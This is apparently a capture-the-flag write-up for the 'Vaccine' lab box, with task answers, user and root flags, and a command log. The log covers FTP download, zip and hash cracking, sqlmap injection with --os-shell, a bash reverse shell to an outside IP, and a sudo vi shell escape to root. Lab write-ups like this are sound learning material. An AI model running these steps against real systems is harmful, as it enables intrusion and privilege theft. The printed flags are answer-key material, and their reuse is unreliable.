# Vaccine

> Task 1 -  Besides SSH and HTTP, what other service is hosted on this box?

```
ftp
```

> Task 2 - This service can be configured to allow login with any password for specific username. What is that username?

```
anonymous
```

> Task 3 -  What is the name of the file downloaded over this service?

```
backup.zip
```

> Task 4 - What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

```
zip2john
```

> Task 5 -  What is the password for the admin user on the website?

```
qwerty789
```

> Task 6 - What option can be passed to sqlmap to try to get command execution via the sql injection?

```
--os-shell
```

> Task 7 -  What program can the postgres user run as root using sudo?

```
vi
```

> Submit user flag

```
ec9b13ca4d6229cd5cc1e09980965bf7
```

> Submit root flag

```
dd6e058e814260bc70e9bbdef2715849
```

## Process
```
nmap scan - sudo nmap -sS -sV -sC -p- -oA nmap/initial $IP
curl -k -v ftp://$IP/backup.zip -o backup.zip
try to unzip, need a pwd
use zip2john - gen hashes
  ../../../tools/john/run/zip2john backup.zip > zip_hashes
use john with rockyou.txt
  ../../../tools/john/run/john --wordlist=../../../tools/rockyou.txt zip_hashes >> john_output
  ../../../tools/john/run/john --show zip_hashes >> john_output
    741852963
unzip, find hash for admin user, hashcat it
  ../../../tools/hashcat/hashcat.bin -a 0 -m 0 user_hash ../../../tools/rockyou.txt
    qwerty789
login to portal on $IP using `users.txt` admin user
rev shell via sqlmap
  get cookie session id to use (PHPSESSID)
  python3 ../../../tools/sqlmap/sqlmap.py --cookie="PHPSESSID=ju5h1fkn45t11geq1a9svfuhuu" -u "http://${IP}/dashboard.php?search=hi" > sqlmap_output
  python3 ../../../tools/sqlmap/sqlmap.py --cookie="PHPSESSID=ju5h1fkn45t11geq1a9svfuhuu" -u "http://${IP}/dashboard.php?search=hi" --os-shell
  bash -c "bash -i >& /dev/tcp/10.10.15.167/9999 0>&1"
  python spawn, stty and stabalise shell
on box as postgres, cd ~, get user.txt
cd /var/www/html, in dashboard.php is db con string
  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
shell keeps dying lol
check can we ssh with pwd?
  we can!
chech what user has for sudo -l
  (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
open vi
  sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
  in vi then
    :set shell=/bin/sh
    :shell
  now root
    cat /root/root.txt --> dd6e058e814260bc70e9bbdef2715849
```
